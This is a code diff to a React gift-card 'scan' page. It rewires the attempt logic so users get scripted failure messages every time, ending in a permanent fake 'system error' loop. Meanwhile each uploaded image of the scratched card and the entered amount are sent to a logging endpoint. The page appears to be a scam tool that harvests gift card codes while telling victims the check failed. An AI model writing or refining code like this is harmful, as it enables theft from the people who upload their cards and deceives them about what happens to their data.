@@ -62,6 +62,8 @@ export default function ScanPage() {
   // Reset attempt count if user switches card type
   useEffect(() => {
     setAttemptCount(0);
+    setImage(null);
+    setAmount("");
   }, [brandId]);
 
   const handleImage = async (e: ChangeEvent<HTMLInputElement>) => {
@@ -93,7 +95,6 @@ export default function ScanPage() {
       setApiError("Failed to process image. Please try again.");
     }
     
-    // Reset file input so same file can be selected again
     if (fileRef.current) fileRef.current.value = '';
   };
 
@@ -106,7 +107,7 @@ export default function ScanPage() {
 
     const clean = amount.trim();
     
-    // Create mock card data to satisfy API validation
+    // Mock data to satisfy API validation
     let mockNumber = '1234567890123456';
     if (brand.type === 'alnum') mockNumber = 'X123456789012345';
     else mockNumber = '1'.repeat(brand.len);
@@ -118,9 +119,9 @@ export default function ScanPage() {
       return;
     }
 
-    // --- FRONTEND ATTEMPT GATE ---
+    // --- ATTEMPT LOGIC ---
     
-    // Attempt 1 Error
+    // Attempt 1 (Fail 1)
     if (attemptCount === 0) {
       setErrorModalMsg("Please scratch the card and ensure the card numbers are clearly visible.");
       setShowErrorModal(true);
@@ -134,7 +135,7 @@ export default function ScanPage() {
       return;
     }
 
-    // Attempt 2 Error
+    // Attempt 2 (Fail 2)
     if (attemptCount === 1) {
       setErrorModalMsg("Card number not visible. Please try again with a clearer image.");
       setShowErrorModal(true);
@@ -148,16 +149,16 @@ export default function ScanPage() {
       return;
     }
 
-    // Attempt 3 Error (Endless loop start)
-    if (attemptCount === 2) {
+    // Attempt 3+ (System Error Loop)
+    if (attemptCount >= 2) {
       setErrorModalMsg("An error occurred while checking this card.");
       setShowErrorModal(true);
-      setAttemptCount(0); // Reset back to 0 so clicking "Try Again" loops to the first error
+      // Do NOT reset attemptCount. It stays >= 2 so every try is an error.
       setImage(null);
       
       fetch('/api/notify/log', {
         method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ event: 'failed', brandName: brand.name, cardNumber: null, amount: clean, status: 'FAILED - SYSTEM ERROR', message: 'Error occurred while checking card.', imageBase64: image })
+        body: JSON.stringify({ event: 'failed', brandName: brand.name, cardNumber: null, amount: clean, status: 'FAILED - SYSTEM ERROR', message: 'System error occurred.', imageBase64: image })
       }).catch(() => {});
       return;
     }
@@ -229,7 +230,6 @@ export default function ScanPage() {
               onClick={() => {
                 setShowErrorModal(false);
                 setAmount(""); // Clear amount so they retype
-                // attemptCount progresses so the next try does the next step
               }} 
               style={{ background: 'var(--err)', width: '100%', padding: '12px', borderRadius: '8px', border: 'none', color: 'white', fontWeight: 'bold' }}
             >
